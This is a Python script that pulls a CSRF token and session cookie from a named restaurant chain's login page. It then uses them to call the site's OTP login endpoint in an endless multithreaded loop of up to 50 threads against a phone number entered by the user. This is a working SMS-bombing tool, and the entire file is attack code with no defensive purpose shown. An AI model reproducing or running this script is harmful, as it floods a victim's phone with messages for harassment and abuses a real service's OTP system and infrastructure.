import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# API URLs
login_url = "https://kfcbd.com/login"
post_url = "https://kfcbd.com/livewire/message/home.login"

# Total requests counter
total_requests = 0

def fetch_csrf_and_session():
    """Fetch CSRF token and session ID."""
    response = requests.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')

    # Extract CSRF token
    csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
    csrf_token = csrf_meta['content'] if csrf_meta else None

    # Extract session cookie
    cookies = response.cookies.get_dict()
    session_id = cookies.get('kfcbd_session')

    if not csrf_token or not session_id:
        raise Exception("Error: Could not retrieve CSRF token or session cookie.")

    return csrf_token, session_id

def send_request(csrf_token, session_id, mobile):
    """Send a single OTP request."""
    global total_requests
    headers = {
        "Host": "kfcbd.com",
        "Content-Type": "application/json",
        "X-CSRF-Token": csrf_token,
        "Cookie": f"kfcbd_session={session_id}"
    }

    payload = {
        "fingerprint": {
            "id": "RGNDZbRhQQMF7FFcuhtd",
            "name": "home.login",
            "locale": "en",
            "path": "login",
            "method": "GET",
            "v": "acj"
        },
        "serverMemo": {
            "children": [],
            "errors": [],
            "htmlHash": "e5067a93",
            "data": {
                "mobile": None,
                "step": 1,
                "get_otp": None,
                "otp": None,
                "previous_url": "https://kfcbd.com"
            },
            "dataMeta": [],
            "checksum": "74e49cafeaf3973778f00c30cc028017653e90cbfe4bfb358f0930ee040d6d9c"
        },
        "updates": [
            {
                "type": "syncInput",
                "payload": {
                    "id": "m0sm",
                    "name": "mobile",
                    "value": mobile
                }
            },
            {
                "type": "callMethod",
                "payload": {
                    "id": "eusv",
                    "method": "login",
                    "params": []
                }
            }
        ]
    }

    try:
        response = requests.post(post_url, headers=headers, json=payload)
        if response.status_code == 200:
            total_requests += 1  # Increment the counter for successful requests
            print(f"[Kfc_api] [{total_requests}] : {response}")
        else:
            print(f"Request failed: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """Main function to send multiple requests."""
    try:
        csrf_token, session_id = fetch_csrf_and_session()
    except Exception as e:
        print(e)
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, csrf_token, session_id, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter mobile number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)
